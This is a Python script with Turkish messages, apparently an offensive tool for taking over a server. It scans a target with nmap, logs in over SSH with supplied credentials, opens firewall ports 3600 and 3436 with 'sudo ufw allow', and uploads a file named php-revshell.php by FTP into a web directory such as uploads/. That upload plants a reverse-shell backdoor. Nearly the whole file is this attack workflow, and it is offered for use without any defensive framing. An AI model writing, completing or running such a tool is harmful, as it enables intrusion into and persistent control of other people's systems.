import tools.nmap_scanner as nmap_tool
import paramiko
from ftplib import FTP

def ssh_connect(target_ip, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(target_ip, username=username, password=password)
        print("[+] SSH bağlantısı başarılı.")
        return client
    except Exception as e:
        print(f"[-] SSH bağlantı hatası: {e}")
        return None

def open_ports_ssh(client, ports):
    try:
        for port in ports:
            command = f"sudo ufw allow {port}"
            stdin, stdout, stderr = client.exec_command(command)
            error = stderr.read().decode()
            if error:
                print(f"[-] {port} portu açılırken hata: {error}")
            else:
                print(f"[+] {port} portu açıldı.")
        return True
    except Exception as e:
        print(f"[-] Port açma hatası: {e}")
        return False

def upload_bot_ftp(target_ip, username, password, local_bot_path, remote_path):
    try:
        ftp = FTP(target_ip)
        ftp.login(username, password)
        with open(local_bot_path, 'rb') as f:
            ftp.storbinary(f'STOR {remote_path}', f)
        ftp.quit()
        print("[+] Bot başarıyla yüklendi.")
        return True
    except Exception as e:
        print(f"[-] FTP dosya yükleme hatası: {e}")
        return False

def write_report(filename, data):
    with open(filename, 'w') as f:
        f.write(data)
    print(f"[+] Rapor {filename} olarak kaydedildi.")

def bot_management_interactive():
    print("=== Bot Yönetimi Başladı ===")
    target = input("Hedef IP veya URL girin: ").strip()
    if target.startswith("http://"):
        target = target[len("http://"):]
    elif target.startswith("https://"):
        target = target[len("https://"):]
    print(f"[*] {target} için port taraması yapılıyor...")
    open_ports = nmap_tool.run_scan(target)
    if not open_ports:
        print("[-] Açık port bulunamadı veya hedef erişilemiyor.")
        return
    print("[+] Açık portlar:", open_ports)

    username = input("SSH kullanıcı adı (port açma için): ").strip()
    password = input("SSH şifresi: ").strip()
    ssh_client = ssh_connect(target, username, password)

    port_open_result = "Atlanıldı"
    if ssh_client:
        port_open = input("Portları 3600 ve 3436 açmak ister misiniz? (y/n): ").strip().lower()
        if port_open == 'y':
            ports_to_open = [3600, 3436]
            if open_ports_ssh(ssh_client, ports_to_open):
                port_open_result = "Yapıldı"
            else:
                port_open_result = "Başarısız"
        ssh_client.close()
    else:
        print("[-] Port açma işlemi için SSH bağlantısı kurulamadı.")

    bot_deploy = input("Botu FTP ile içeri atmak ister misiniz? (y/n): ").strip().lower()
    bot_deploy_result = "Yapılmadı"
    if bot_deploy == 'y':
        ftp_user = input("FTP kullanıcı adı: ").strip()
        ftp_pass = input("FTP şifresi: ").strip()
        local_bot_path = "php-revshell.php"
        remote_path = input("Botu yükleyeceğiniz uzak dosya yolu (örn: uploads/php-revshell.php): ").strip()
        if upload_bot_ftp(target, ftp_user, ftp_pass, local_bot_path, remote_path):
            bot_deploy_result = "Yapıldı"

    report = f"""
=== RAPOR ===
Hedef: {target}
Açık portlar: {open_ports}
Port açma işlemi: {port_open_result}
Bot atma işlemi: {bot_deploy_result}
"""
    print(report)
    save_report = input("Raporu dosya olarak kaydetmek ister misiniz? (y/n): ").strip().lower()
    if save_report == 'y':
        filename = input("Dosya adı (örn: rapor.txt): ").strip()
        write_report(filename, report)
